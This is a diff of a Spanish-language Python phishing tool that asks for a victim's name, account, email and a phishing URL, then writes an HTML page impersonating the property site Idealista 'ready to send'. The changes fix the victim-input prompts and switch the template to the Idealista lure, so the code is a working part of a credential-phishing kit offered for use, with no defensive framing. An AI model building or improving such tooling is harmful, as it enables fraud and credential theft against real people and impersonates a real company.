@@ -4,13 +4,13 @@ import sys
 import smtplib
 from helper.helper import getPath
 
-def building_selling():
+def building_selling_es():
     
     #Información de la victima
     userName = input("Introduce el nombre de tu victima-->")
     userAccount = input("Introduce la cuenta de usuario de tu victima-->")
-    url=("Introduce el url de phishing-->")
-    userEmail=("Introduce el email de la victima-->")
+    url=input("Introduce el url de phishing-->")
+    userEmail=input("Introduce el email de la victima-->")
     
     date=time.localtime()
     currentDate=time.strftime("%D %B %Y, %H:%M:%S",date)
@@ -2256,7 +2256,7 @@ def building_selling():
                     """).format()
     fileNameHtml=userName+str(date)+"Idealista.html"
     htmlFile=open("./reportFolder/"+fileNameHtml,"w")
-    htmlFile.write(atalasianHtml)
+    htmlFile.write(idealista_html)
     htmlFile.close()
     print("HTML creado y preparado para enviar")
     getPath()
